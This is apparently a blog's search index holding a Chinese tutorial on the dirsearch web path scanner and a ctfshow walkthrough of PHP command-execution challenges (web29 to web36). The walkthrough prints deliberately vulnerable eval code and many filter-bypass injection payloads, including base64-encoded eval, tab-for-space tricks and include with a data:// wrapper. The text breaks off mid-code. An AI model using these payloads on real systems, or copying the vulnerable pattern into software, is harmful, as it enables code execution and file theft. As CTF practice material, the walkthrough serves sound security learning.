<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF-web工具dirsearch获取和使用方式</title>
      <link href="/2026/02/04/CTF-web%E5%B7%A5%E5%85%B7dirsearch%E8%8E%B7%E5%8F%96%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/"/>
      <url>/2026/02/04/CTF-web%E5%B7%A5%E5%85%B7dirsearch%E8%8E%B7%E5%8F%96%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="一、dirsearch-是什么？"><a href="#一、dirsearch-是什么？" class="headerlink" title="一、dirsearch 是什么？"></a>一、dirsearch 是什么？</h2><p><strong>dirsearch</strong> 是一款用 <strong>Python 编写的 Web 目录/文件扫描工具</strong>，常用于安全测试中发现：</p><ul><li>隐藏目录（<code>/admin/</code>、<code>/backup/</code>）</li><li>敏感文件（<code>.git/</code>、<code>.env</code>、<code>config.php</code>）</li><li>备份、接口、历史文件等</li></ul><p>👉 本质：<strong>暴力枚举 Web 路径</strong></p><hr><h2 id="二、dirsearch-获取方式（安装）"><a href="#二、dirsearch-获取方式（安装）" class="headerlink" title="二、dirsearch 获取方式（安装）"></a>二、dirsearch 获取方式（安装）</h2><h3 id="方式-1：GitHub-官方（推荐）"><a href="#方式-1：GitHub-官方（推荐）" class="headerlink" title="方式 1：GitHub 官方（推荐）"></a>方式 1：GitHub 官方（推荐）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/maurosoria/dirsearch.git</span><br><span class="line"><span class="built_in">cd</span> dirsearch</span><br></pre></td></tr></tbody></table></figure><h3 id="方式-2：直接用-pip（部分系统）"><a href="#方式-2：直接用-pip（部分系统）" class="headerlink" title="方式 2：直接用 pip（部分系统）"></a>方式 2：直接用 pip（部分系统）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pip install dirsearch</span><br></pre></td></tr></tbody></table></figure><h3 id="方式-3：Kali-Linux（自带）"><a href="#方式-3：Kali-Linux（自带）" class="headerlink" title="方式 3：Kali Linux（自带）"></a>方式 3：Kali Linux（自带）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">dirsearch</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="三、运行前准备"><a href="#三、运行前准备" class="headerlink" title="三、运行前准备"></a>三、运行前准备</h2><h3 id="Python-版本"><a href="#Python-版本" class="headerlink" title="Python 版本"></a>Python 版本</h3><ul><li>推荐 <strong>Python 3.7+</strong></li></ul><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 --version</span><br></pre></td></tr></tbody></table></figure><h3 id="安装依赖（如果报错）"><a href="#安装依赖（如果报错）" class="headerlink" title="安装依赖（如果报错）"></a>安装依赖（如果报错）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="四、最基本使用方式"><a href="#四、最基本使用方式" class="headerlink" title="四、最基本使用方式"></a>四、最基本使用方式</h2><h3 id="1️⃣-扫描一个网站"><a href="#1️⃣-扫描一个网站" class="headerlink" title="1️⃣ 扫描一个网站"></a>1️⃣ 扫描一个网站</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com</span><br></pre></td></tr></tbody></table></figure><h3 id="2️⃣-扫描-HTTPS"><a href="#2️⃣-扫描-HTTPS" class="headerlink" title="2️⃣ 扫描 HTTPS"></a>2️⃣ 扫描 HTTPS</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://example.com</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="五、常用参数（重点）"><a href="#五、常用参数（重点）" class="headerlink" title="五、常用参数（重点）"></a>五、常用参数（重点）</h2><h3 id="🔹-指定扩展名（非常重要）"><a href="#🔹-指定扩展名（非常重要）" class="headerlink" title="🔹 指定扩展名（非常重要）"></a>🔹 指定扩展名（非常重要）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">-e php,asp,aspx,jsp,html,js,zip</span><br></pre></td></tr></tbody></table></figure><p>示例：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -e php,html,js</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="🔹-指定字典"><a href="#🔹-指定字典" class="headerlink" title="🔹 指定字典"></a>🔹 指定字典</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">-w /path/to/wordlist.txt</span><br></pre></td></tr></tbody></table></figure><p>示例：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -w db/dicc.txt</span><br></pre></td></tr></tbody></table></figure><p>dirsearch 自带字典位置：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">dirsearch/db/</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="🔹-多线程（加快速度）"><a href="#🔹-多线程（加快速度）" class="headerlink" title="🔹 多线程（加快速度）"></a>🔹 多线程（加快速度）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">-t 50</span><br></pre></td></tr></tbody></table></figure><p>示例：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -t 50</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="🔹-排除状态码"><a href="#🔹-排除状态码" class="headerlink" title="🔹 排除状态码"></a>🔹 排除状态码</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">--exclude-status 403,404</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="🔹-排除指定长度（过滤假-200）"><a href="#🔹-排除指定长度（过滤假-200）" class="headerlink" title="🔹 排除指定长度（过滤假 200）"></a>🔹 排除指定长度（过滤假 200）</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">--exclude-sizes 1234,5678</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="🔹-保存结果"><a href="#🔹-保存结果" class="headerlink" title="🔹 保存结果"></a>🔹 保存结果</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">--output result.txt</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="六、常见实战组合（推荐直接用）"><a href="#六、常见实战组合（推荐直接用）" class="headerlink" title="六、常见实战组合（推荐直接用）"></a>六、常见实战组合（推荐直接用）</h2><h3 id="🔥-常规扫描"><a href="#🔥-常规扫描" class="headerlink" title="🔥 常规扫描"></a>🔥 常规扫描</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -e php,html,js -t 50</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="🔥-后台-接口扫描"><a href="#🔥-后台-接口扫描" class="headerlink" title="🔥 后台/接口扫描"></a>🔥 后台/接口扫描</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -e php,asp,aspx -w db/admin.txt</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="🔥-扫描备份文件"><a href="#🔥-扫描备份文件" class="headerlink" title="🔥 扫描备份文件"></a>🔥 扫描备份文件</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com -e zip,rar,tar,gz,bak,old</span><br></pre></td></tr></tbody></table></figure><hr><h3 id="🔥-API-扫描"><a href="#🔥-API-扫描" class="headerlink" title="🔥 API 扫描"></a>🔥 API 扫描</h3><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://example.com/api -e json -w db/api.txt</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="七、结果怎么看？"><a href="#七、结果怎么看？" class="headerlink" title="七、结果怎么看？"></a>七、结果怎么看？</h2><p>示例输出：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">[200] /admin/</span><br><span class="line">[403] /config/</span><br><span class="line">[200] /backup.zip</span><br></pre></td></tr></tbody></table></figure><p>含义：</p><ul><li><strong>200</strong>：可访问（重点）</li><li><strong>403</strong>：存在但禁止访问（有价值）</li><li><strong>301/302</strong>：重定向（可能是后台）</li><li><strong>404</strong>：不存在（忽略）</li></ul><hr><h2 id="八、常见坑-建议"><a href="#八、常见坑-建议" class="headerlink" title="八、常见坑 &amp; 建议"></a>八、常见坑 &amp; 建议</h2><p>⚠️ <strong>注意事项</strong></p><ul><li>不要盲目 200 = 真目录（注意假 200）</li><li>搭配浏览器 / Burp 复查</li><li>多换字典，效果差距很大</li></ul><p>✅ <strong>提升命中率技巧</strong></p><ul><li>指定扩展名</li><li>自定义字典（结合目标语言）</li><li>先扫 <code>/admin</code>、<code>/api</code>、<code>/test</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-ctfshow_Web入门_命令执行1</title>
      <link href="/2026/02/04/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/"/>
      <url>/2026/02/04/CTF-ctfshow_Web%E5%85%A5%E9%97%A8_%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C1/</url>
      
        <content type="html"><![CDATA[<p><em>题目来源：<a href="https://ctf.show/challenges">CTFshow</a></em></p><p><em>练习时间：2026年2月4日</em></p><p><em>练习数量：2</em></p><h2 id="⭐️-01-web29"><a href="#⭐️-01-web29" class="headerlink" title="⭐️ 01 web29"></a>⭐️ 01 web29</h2><p>🚩flag：<code>ctfshow{9bcc229d-a475-4c4a-a635-def2043c1af1}</code></p><p>💡hint：<code>命令执行</code></p><p>🔧tool：<code>dirsearch</code></p><p>题目：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:26:48</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>PHP 代码执行题目，需要绕过过滤读取 flag。<br>首先要知道目录下有什么文件，可以传入c=passthru(“ls”);或c=system(“ls”); ?c=system(“ls -la”);<br>或者使用通用工具dirsearch：<br><img src="https://a1.boltp.com/2026/02/04/6983320739099.png"><br><a href="https://sereniusx.github.io/2026/02/04/CTF-web%E5%B7%A5%E5%85%B7dirsearch%E8%8E%B7%E5%8F%96%E5%92%8C%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/">dirsearch获取和使用方式</a><br>因此是需要访问flag.php文件</p><p>绕过过滤的方法：<br>方法1：使用通配符</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">"cat f*"</span>);</span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">"cat fla?"</span>);</span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">"cat f[!-f][!-l][!-a][!-g]*"</span>);</span><br></pre></td></tr></tbody></table></figure><p>方法2：使用命令替换</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">"cat f"</span><span class="string">"lag"</span>);</span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">"cat f'la'g"</span>);</span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">"cat f"</span>.<span class="string">"lag"</span>);</span><br><span class="line">?c=<span class="title function_ invoke__">system</span>(<span class="string">"cat f"</span>.<span class="variable">$x</span>.<span class="string">"lag"</span>);  <span class="comment"># 需要先定义$x</span></span><br></pre></td></tr></tbody></table></figure><p>方法3：使用 base64</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">"c3lzdGVtKCJjYXQgZmxhZy5waHAiKTs="</span>));</span><br><span class="line"><span class="comment"># 解码后是：system("cat flag.php");</span></span><br></pre></td></tr></tbody></table></figure><p>方法4：使用 include（如果flag是PHP文件）</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span>(<span class="string">"fl"</span>.<span class="string">"ag.php"</span>);</span><br><span class="line">?c=<span class="title function_ invoke__">show_source</span>(<span class="string">"fl"</span>.<span class="string">"ag.php"</span>);</span><br></pre></td></tr></tbody></table></figure><p>方法5：通过变量传递</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="variable">$a</span>=<span class="string">"fla"</span>;<span class="variable">$b</span>=<span class="string">"g"</span>;<span class="title function_ invoke__">system</span>(<span class="string">"cat <span class="subst">$a</span><span class="subst">$b</span>"</span>);</span><br></pre></td></tr></tbody></table></figure><p>方法6：使用反引号执行命令</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="keyword">echo</span> `cat f*`;</span><br></pre></td></tr></tbody></table></figure><p><strong>Exp:</strong></p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">https:<span class="comment">//c5ce659a-6bce-4f52-8d22-6f0008e377ae.challenge.ctf.show/?c=system("tac%20fla*");</span></span><br></pre></td></tr></tbody></table></figure><p>得到flag：<br><img src="https://a1.boltp.com/2026/02/04/698336ab409f0.png"></p><hr><h2 id="⭐️-02-web30"><a href="#⭐️-02-web30" class="headerlink" title="⭐️ 02 web30"></a>⭐️ 02 web30</h2><p>🚩flag：<code>ctfshow{28d0d833-a082-49b5-90a5-8574c8681bc6}</code></p><p>💡hint：<code>命令执行</code></p><p>题目信息：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:42:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>过滤了flag、system、php<br>过滤了命令执行函数system，还可以用passthur()</p><p><strong>Exp：</strong></p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">https:<span class="comment">//edb4d14f-431c-4858-828e-65b8c241fdcb.challenge.ctf.show/?c=passthru("tac%20fla*");</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="⭐️-03-web31"><a href="#⭐️-03-web31" class="headerlink" title="⭐️ 03 web31"></a>⭐️ 03 web31</h2><p>🚩flag：<code>ctfshow{28d0d833-a082-49b5-90a5-8574c8681bc6}</code></p><p>💡hint：<code>命令执行</code></p><p>题目信息：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>更严格的过滤。flag|system|php|cat|sort|shell还有空格<br>还是可以用passthru。空格可以使用%09代替。cat可以用tac代替。</p><p><strong>Exp：</strong></p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">https:<span class="comment">//91b62710-1f62-445b-b6e4-bf0e24abaa1c.challenge.ctf.show/?c=passthru("tac%09fla*");</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="⭐️-04-web32"><a href="#⭐️-04-web32" class="headerlink" title="⭐️ 04 web32"></a>⭐️ 04 web32</h2><p>🚩flag：<code>ctfshow{d19d26f9-022c-466d-a094-b1f68068d3dc}</code></p><p>💡hint：<code>命令执行</code></p><p>题目：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:56:31</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Exp:</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system("tac flag.php")?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>过滤规则禁用了括号()，但PHP在某些情况下允许省略函数调用的括号<br>include$_GET[1]等价于 include($_GET[1])<br>这是PHP的语言特性：某些控制结构和函数可以省略括号</p><p>?&gt;结束PHP代码段<br>这样可以保证语法正确，避免解析错误</p><p>GET参数传递：<br>通过$_GET[1]参数传递要包含的内容<br>1=对应$_GET[1]，值为后面的data://协议内容</p><p>data://- PHP支持的伪协议，可以直接在URI中包含数据<br>text/plain- 指定数据类型为纯文本<br><!--?php system("tac flag.php")?-->- 实际的PHP代码</p><hr><h2 id="⭐️-05-web33"><a href="#⭐️-05-web33" class="headerlink" title="⭐️ 05 web33"></a>⭐️ 05 web33</h2><p>🚩flag：<code>ctfshow{bccb4b7a-2b54-4397-89fa-0747f997fdea}</code></p><p>💡hint：<code>命令执行</code></p><p>题目：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 02:22:27</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>同样可以用上题的exp</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system("tac flag.php")?&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="06-web34"><a href="#06-web34" class="headerlink" title="06 web34"></a>06 web34</h2><p>🚩flag：<code>ctfshow{d3d4e5d9-6a28-44d3-b030-5718d2c602eb}</code></p><p>💡hint：<code>命令执行</code></p><p>题目：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>同样可以用上题的exp：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system("tac flag.php")?&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="07-web35"><a href="#07-web35" class="headerlink" title="07 web35"></a>07 web35</h2><p>🚩flag：<code>ctfshow{909c0544-f55d-4c38-94e6-db16f26d4de5}</code></p><p>💡hint：<code>命令执行</code></p><p>同样可以用上题的exp：</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[<span class="number">1</span>]<span class="meta">?&gt;</span>&amp;<span class="number">1</span>=data:<span class="comment">//text/plain,&lt;?php system("tac flag.php")?&gt;</span></span><br></pre></td></tr></tbody></table></figure><hr><h2 id="08-web36"><a href="#08-web36" class="headerlink" title="08 web36"></a>08 web36</h2><p>🚩flag：<code>ctfshow{ecb2d3b1-2377-4716-b779-457aa8b09ce3}</code></p><p>💡hint：<code>命令执行</code></p><p>这次把数字也过滤了</p><figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:12:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 04:21:16</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'c'</span>])){</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\&lt;|\=|\/|[0-9]/i"</span>, <span class="variable">$c</span>)){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">}<span class="keyword">else</span>{</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span 